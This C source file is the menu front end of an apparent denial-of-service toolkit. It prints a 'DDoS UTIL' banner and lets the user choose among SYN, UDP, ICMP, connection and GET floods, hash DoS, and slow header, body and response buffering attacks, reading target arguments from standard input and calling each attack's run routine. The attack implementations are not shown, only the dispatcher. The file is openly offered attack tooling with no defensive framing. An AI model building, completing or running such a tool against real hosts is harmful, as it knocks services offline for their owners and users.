#include "header.h"

#include "ddos/get_flood.h"
#include "ddos/icmp_flood.h"
#include "ddos/syn_flood.h"
#include "ddos/udp_flood.h"
#include "ddos/conn_flood.h"
#include "ddos/hash_dos.h"
#include "ddos/header_buffering.h"
#include "ddos/body_buffering.h"
#include "ddos/response_buffering.h"

#define __SIZE_OF_INPUT__ 200
#define __MAX_TOKEN_NUM__ 20

char input[__SIZE_OF_INPUT__ ];
char *tokens[__MAX_TOKEN_NUM__ ];

void get_input() {
	printf("$ ");
	fgets(input, __SIZE_OF_INPUT__, stdin);

}
void make_tokens() {
	int i = 0;
	for (i = 0; i < __MAX_TOKEN_NUM__; i++)
		tokens[i] = NULL;
	i = 0;

	tokens[i] = strtok(input, " ");
	while (tokens[i] != NULL) {
		i++;
		tokens[i] = strtok(NULL, " ");
	}

}
int choose_running_type() {
	printf("== Choose Running Type\n");
	printf("== 1. Number Based\n"
			"== 2. Over Time\n");
	printf("== ");
	get_input();
	int t = atoi(input);
	while (t <= 0 || t > 2) {
		printf("Input should be over 0 AND <=2\n");
		get_input();
		t = atoi(input);
	}

	return t;
}

int type_choose_menu() {
	printf("1. SYN flooding\n"
			"2. UDP flooding\n"
			"3. ICMP flooding\n"
			"4. Connection flooding\n"
			"5. Get flooding\n"
			"6. Header buffering\n"
			"7. Body buffering\n"
			"8. Response buffering\n"
			"9. Hash Dos\n"
			"10. RefRef\n\n");

	get_input();
	int t = atoi(input);
	while (t <= 0 || t > 10) {
		printf("Input should be over 0 AND <=10\n");
		get_input();
		t = atoi(input);
	}

	return t;

}

#define DRAW_HEIGHT 7
#define DRAW_WIDTHB 8
#define DRAW_WIDTHS 6
void print_main() {

	char num[11];  //here too one extra room is needed for the '\0'
	char c;  //for option
	int i, j, k;
	//declaring char 2D arrays and initializing with hash-printed digits
	char bigD[DRAW_HEIGHT][DRAW_WIDTHB] = { " ####  ", //H=0
			" #   # ", //H=1
			" #   # ", //H=2
			" #   # ", //H=3
			" #   # ", //H=4
			" #   # ", //H=5
			" ####  " }, //H=6

			litO[DRAW_HEIGHT][DRAW_WIDTHB] = { "       ", "       ", "       ",
					" ##### ", " #   # ", " #   # ", " ##### " },

			bigS[DRAW_HEIGHT][DRAW_WIDTHB] = { " ##### ", " #     ", " #     ",
					" ##### ", "     # ", "     # ", " ##### " },

			bigU[DRAW_HEIGHT][DRAW_WIDTHB] = { "       ", " #   # ", " #   # ",
					" #   # ", " #   # ", " #   # ", " ##### " },

			litT[DRAW_HEIGHT][DRAW_WIDTHB] = { "       ", "       ", "   #   ",
					" ##### ", "   #   ", "   #   ", "   ### " },

			litI[DRAW_HEIGHT][DRAW_WIDTHS] = { "     ", "     ", "  #  ",
					"     ", "  #  ", "  #  ", "  #  " },

			litL[DRAW_HEIGHT][DRAW_WIDTHS] = { "     ", "  #  ", "  #  ",
					"  #  ", "  #  ", "  #  ", "  #  " };

	printf("-----------------------------\n");

	for (i = 0; i < DRAW_HEIGHT; i++) {
		printf("|");
		for (j = 0; j < DRAW_WIDTHB; j++)
			printf("%c", bigD[i][j]);

		for (j = 0; j < DRAW_WIDTHB; j++)
			printf("%c", bigD[i][j]);

		for (j = 0; j < DRAW_WIDTHB; j++)
			printf("%c", litO[i][j]);

		for (j = 0; j < DRAW_WIDTHB; j++)
			printf("%c", bigS[i][j]);
		printf("|");
		printf("\n");
	}


	for (i = 0; i < DRAW_HEIGHT; i++) {
		printf("|");
		for (j = 0; j < DRAW_WIDTHB; j++)
			printf("%c", bigU[i][j]);

		for (j = 0; j < DRAW_WIDTHB; j++)
			printf("%c", litT[i][j]);

		for (j = 0; j < DRAW_WIDTHS; j++)
			printf("%c", litI[i][j]);

		for (j = 0; j < DRAW_WIDTHS; j++)
			printf("%c", litL[i][j]);

		printf("    |");
		printf("\n");
	}
	printf("-----------------------------\n");

}

int main(void) {
	int mode;

	print_main();

	while (1) {
		int type = type_choose_menu();

		switch (type) {
		case 1:		//syn flooding
			syn_flood_print_usage(2);
			get_input();
			make_tokens();
			syn_flood_run(tokens, 2);
			break;
		case 2:		//UDP flooding
			udp_flood_print_usage();
			get_input();
			make_tokens();
			udp_flood_main(tokens);
			break;
		case 3:		//ICMP flooding
			icmp_flood_print_usage();
			get_input();
			make_tokens();
			icmp_flood_main(tokens);
			break;
		case 4:		//connection flooding
			conn_flood_print_usage(1);
			get_input();
			make_tokens();
			conn_flood_run(tokens, 1);
			break;
		case 5:		//get flooding
			get_flood_print_usage();
			get_input();
			make_tokens();
			get_flood_main(tokens);
			break;
		case 6: //header buffering
			header_buffering_print_usage();
			get_input();
			make_tokens();
			header_buffering_main(tokens);
			break;
		case 7:		//body buffering
			body_buffering_print_usage();
			get_input();
			make_tokens();
			body_buffering_main(tokens);
			break;
		case 8:		//response buffering
			response_buffering_print_usage(2);
			get_input();
			make_tokens();
			response_buffering_run(tokens, 2);
			break;
		case 9:		//Hash Dos
			mode = choose_running_type();
			hash_dos_print_usage(mode);
			get_input();
			make_tokens();
			hash_dos_run(tokens, mode);
			break;
		case 10:	//Ref Ref
			break;

		}

	}
}
